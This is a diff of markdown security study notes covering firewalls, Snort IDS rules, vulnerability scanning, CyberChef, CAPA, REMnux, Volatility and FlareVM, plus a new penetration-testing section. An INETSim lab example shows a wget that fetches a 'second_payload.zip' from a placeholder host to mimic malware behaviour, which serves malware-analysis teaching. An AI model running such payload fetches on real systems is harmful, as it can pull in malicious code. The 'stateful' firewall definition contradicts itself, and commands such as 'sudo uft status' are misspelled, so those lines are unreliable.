 Firewalls can be cateogrised into different types:
 + Stateful - determines the behaviour of a device based on the entire connection; filters the data based on predetermined rules, without considering the state of previous connections; operates at OSI layer 3 and 4
@@ -2032,7 +2033,7 @@ Rules can be categorised by direction:
 + Forward - forward traffic inside a network
 
 ### E.g. Windows Defender Firewall
-<i>Windows Defender Firewall</i> can create rules that can restrict incoming and outgoing network traffic. 
+*Windows Defender Firewall* can create rules that can restrict incoming and outgoing network traffic. 
 
 There are two available network profiles:
 + Private networks - includes configurations to apply when connected to home networks
@@ -2043,12 +2044,12 @@ Custom rules can be created in Advanced Settings.
 ### E.g. Linux iptables Firewall
 For Linux, there are multiple fire wall options available.
 
-<i>Netfilter</i> is the framework within Linux OS with core firewall functionalities (i.e. packet filtering, NAT, connection tracking). Some common firewall utilities include:
+*Netfilter* is the framework within Linux OS with core firewall functionalities (i.e. packet filtering, NAT, connection tracking). Some common firewall utilities include:
 + iptables - most widely used utility
 + nftables - successor to iptables with enhanced packet filtering and NAT capabilities
 + firewalld - has predefined rule sets
 
-<i>Uncomplicated Firewall (ufw)</i> provides an easier interface (i.e. easier commands). Common commands include:
+*Uncomplicated Firewall (ufw)* provides an easier interface (i.e. easier commands). Common commands include:
 + **sudo uft status** - check firewall status; add **numbered** to list down all active rules
 + **sudo ufw enable** - enable firewall; use **disable** to disable
 + **sudo ufw default allow outgoing** - allow outgoing connections as a default policy; use **incoming** for inbound connections
@@ -2056,7 +2057,7 @@ For Linux, there are multiple fire wall options available.
 + **sudo ufw delete 2** - delete a specific rule (i.e. based from numbers from sudo uft status numbered)
 
 ## IDS
-<i>Intrustion Detection Systems (IDS)</i> monitors for abnormal traffic and notifies security administrators. 
+*Intrustion Detection Systems (IDS)* monitors for abnormal traffic and notifies security administrators. 
 
 These can be deployed in two ways:
 + Host Intrusion Detection System (HIDS) - installed individually and detects threats on a particular host; provide visibility on host's activities
@@ -2068,14 +2069,14 @@ IDS can classified into different detection modes:
 + Hybrid - combines the detection methods (i.e. signature and anomly-based)
 
 ### E.g. Snort
-<i>Snort</i> is an open-source IDS that uses signature- and anomaly-based threat detection. Several built-in tools come pre-installed with the tool. Custom rules can also be made depending on requirements. 
+*Snort* is an open-source IDS that uses signature- and anomaly-based threat detection. Several built-in tools come pre-installed with the tool. Custom rules can also be made depending on requirements. 
 
 Snort has several modes:
 + Packet sniffer mode - reads and displays network packets without performing analysis; can be helpful in network monitoring and troubleshooting (i.e. diagnosing issues)
 + Packet logging mode - detects real-time network traffic and displays them as alerts for security administrators; also allows packet logging as PCAP files for offline analysis
 + Network Intrusion Detection System mode - primary mode that monitors network traffic in real-time and applies rule files to identify and match traffic to known attack patterns; successful matches will generate alerts
 
-Snort built-in rules, configuration, and other files can be found in /<i>etc/snort</i> directory. The <i>snort.conf</i> file is particularly useful for rule enabling and network range configuration settings. The <i>rules</i> folder contains the rule files.
+Snort built-in rules, configuration, and other files can be found in /*etc/snort* directory. The *snort.conf* file is particularly useful for rule enabling and network range configuration settings. The *rules* folder contains the rule files.
 
 #### Rule Creation
 Rules follow a specific format: [action] [protocol] [source_ip] [source_port] -> [destination_ip] [destination port] rule_metadata([msg; sid, rev])
@@ -2101,7 +2102,7 @@ sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf
 ```
 
 ## Vulnerability Scanning
-<i>Vulnerabilities</i> are weaknesses in software programs or hardware that can be leveraged by attackers. <i>Patching</i> is the process of fixing these vulnerabilities.
+*Vulnerabilities* are weaknesses in software programs or hardware that can be leveraged by attackers. *Patching* is the process of fixing these vulnerabilities.
 
 However, these vulnerabilities must be scanned for. These scans can be categorised into the following:
 + Authenticated vs Unauthenticated Scans
@@ -2127,7 +2128,7 @@ Some vulnerability scanning tools include:
 + [OpenVAS](https://www.openvas.org/) - offers basic features with known vulnerabilities scanned through its database; less extensive but is beneficial for small organisations and invidivudal systems
 
 ### CVE
-<i>Common Vulnerabilities and Exposures (CVE)</i> is a unique identifier given to software vulnerabilities. Developed by the MITRE Corporation, these CVE numbers are published online in a database. 
+*Common Vulnerabilities and Exposures (CVE)* is a unique identifier given to software vulnerabilities. Developed by the MITRE Corporation, these CVE numbers are published online in a database. 
 
 E.g. CVE-2024-9374
 + CVE prefix - each CVE has "CVE" in the beginning
@@ -2135,7 +2136,7 @@ E.g. CVE-2024-9374
 + Arbitrary digits - contains four or more arbitrary digits
 
 ### CVSS
-<i>Common Vulnerability Scoring System (CVSS)</i> is a score that provide the severity of a vulnerability. It is calculated by factoring its impact, easy of exploitability, etc.
+*Common Vulnerability Scoring System (CVSS)* is a score that provide the severity of a vulnerability. It is calculated by factoring its impact, easy of exploitability, etc.
 
 A summary of scores is as follows:
 
@@ -2154,10 +2155,10 @@ sudo apt install docker.io
 ```
 sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
 ```
-Access OpenVAS through the browser at <i>https://127.0.0.1</i>
+Access OpenVAS through the browser at *https://127.0.0.1*
 
 ## CyberChef
-<i>CyberChef</i> is a web-based application tool that can do encoding and decoding. It is often referred to as a "Swiss Army Knife" for data. This tool can be accessed [online](https://gchq.github.io/CyberChef/) or [downloaded locally](https://github.com/gchq/CyberChef/releases).
+*CyberChef* is a web-based application tool that can do encoding and decoding. It is often referred to as a "Swiss Army Knife" for data. This tool can be accessed [online](https://gchq.github.io/CyberChef/) or [downloaded locally](https://github.com/gchq/CyberChef/releases).
 
 ### Navigating the Interface
 CyberChef has four areas:
@@ -2201,7 +2202,7 @@ Refer to these commonly used operation categories:
 | To Base58 | Encodes using restricted set of symbols | Thm62 becomes 6NiRkOY |
 
 ## CAPA
-<i>Common Analysis Platform for Artifacts (CAPA)</i> is a tool that can identify the capabilities present in executable files (e.g. PE executables, ELF binaries, .NET modules, shellcodes, sandbox reports). It is capable of conducting static analysis by applying rules to describe common behaviours, which can determine a program's capability (e.g. network communication, file manipulation, process injection, etc)
+*Common Analysis Platform for Artifacts (CAPA)* is a tool that can identify the capabilities present in executable files (e.g. PE executables, ELF binaries, .NET modules, shellcodes, sandbox reports). It is capable of conducting static analysis by applying rules to describe common behaviours, which can determine a program's capability (e.g. network communication, file manipulation, process injection, etc)
 
 Main command: **capa ./[executable_file]**
 
@@ -2265,10 +2266,10 @@ For the example above is broken down as follows:
 + reference-anti-vm-strings-targeting-virtualbox.yml and reference-anti-vm-strings-targeting-virtualpc.yml contain the rules
 
 ## REMnux
-The <i>REMnux VM</i> is a Linux distro specifically designed to provide a sandbox-like environment for analysing malware. It includes tools like Volatility, YARA, Wireshark, oledump, and INETSim.
+The *REMnux VM* is a Linux distro specifically designed to provide a sandbox-like environment for analysing malware. It includes tools like Volatility, YARA, Wireshark, oledump, and INETSim.
 
 ### Use Case: File Analysis
-<i>oledump.py</i> can be used to conduct static analysis on potentially malicious Object Linking and Embedding (OLE2) files, which is proprietary technology of Microsoft. These files are used to store multiple data types (e.g. documents, spreadsheets, presentations) into a single file.
+*oledump.py* can be used to conduct static analysis on potentially malicious Object Linking and Embedding (OLE2) files, which is proprietary technology of Microsoft. These files are used to store multiple data types (e.g. documents, spreadsheets, presentations) into a single file.
 
 Command syntax: **oledump.py [file]**
 
@@ -2279,9 +2280,9 @@ Common extensions:
 Note: macros are listed with the presence of a 'M' in the datastream
 
 ### Use Case: Fake Network to Aid Analysis
-<i>Internet Services Simulation Suite (INETSim)</i> can be used to simulate a real network attack by malware. 
+*Internet Services Simulation Suite (INETSim)* can be used to simulate a real network attack by malware. 
 
-Note: configuring the <i>/etc/inetsim/inetsim.conf</i> is required, particularly changing the <i>#dns_default_ip</i> value
+Note: configuring the */etc/inetsim/inetsim.conf* is required, particularly changing the *#dns_default_ip* value
 
 Command syntax: **sudo inetsim**
 
@@ -2291,10 +2292,10 @@ From here, usual malware behaviour can be executed (e.g. downloading a binary/sc
 ```
 sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
 ```
-When INETSim is stopped, it will create a report on its captured connections. This can be found in the <i>/var/log/inetsim/report/</i> directory.
+When INETSim is stopped, it will create a report on its captured connections. This can be found in the */var/log/inetsim/report/* directory.
 
 ### Use Case: Evidence Preprocessing
-<i>Volatility</i> can be used to identify and extract artefacts from memory images, which results in output that can be saved to text files (e.g. text or JSON) for further analysis.
+*Volatility* can be used to identify and extract artefacts from memory images, which results in output that can be saved to text files (e.g. text or JSON) for further analysis.
 
 Command syntax: **vol3 -f [mem_file] [plugin]**
 
@@ -2335,7 +2336,7 @@ Note: processing these in bulk using loops is helpful. E.g.
 for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
 ```
 
-The <i>strings</i> utility can be used to extract ASCII, 16-bit little-endian, and 16-bit big-endian strings. 
+The *strings* utility can be used to extract ASCII, 16-bit little-endian, and 16-bit big-endian strings. 
 ```
 strings wcry.strings.ascii.txt
 ```
@@ -2347,7 +2348,7 @@ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
 ```
 
 ## FlareVM
-<i>Forensice, Logic Analysis, and Reverse Engineering</i> is a set of specialised tools used in reverse engineering, malware analysis, incident response, forensic investigation, and penetration testing. 
+*Forensice, Logic Analysis, and Reverse Engineering* is a set of specialised tools used in reverse engineering, malware analysis, incident response, forensic investigation, and penetration testing. 
 
 ### Use Cases and Tool Kit
 Tools are grouped into various categories below:
@@ -2414,3 +2415,21 @@ These tools are usued for initial investigations:
 | CFF Explorer | Generates file hashes for integrity verification, authenticate source of system files, and check for validaty |
 | PEStudio | Static analysis of executable file properties |
 | FLOSS | Extracts and de-obfuscates all strings from malware programs using static analysis techniques |
+
+## Penetration Testing
+A *penetration test* is an ethical attempt to analyse the security defenses of a system. It uses the same tools, techniques, and methodologies that malicious actors would use. A pentest is similar to an audit.
+
+Hackers are grouped into three hats, depending on their ethics and motivations:
+| Category | Description |
+| :------: | :-----: |
+| White Hat | Remain within the law and use skills to benefit others |
+| Grey Hat | Use skills to benefit others; may not follow the law or ethics at all times |
+| Black Hat | Criminals and often seek to damage or gain benefit at the cost of others |
+
+### Rules of Engagement (ROE)
+The ROE is a document used in the initial stages of a pentest, primarily to decide how an engagement is to be carried out. This contains three main sections:
+1. Permission - gives explicit permission for the engagement to be done; essential for legal protection
+2. Test Scope - lists specific targets to which the engagements can apply (e.g. only a segment of the server, not the whole network)
+3. Rules - define techniques that are permitted (e.g. no phshing, allow MITM)
+
+### Methodologies
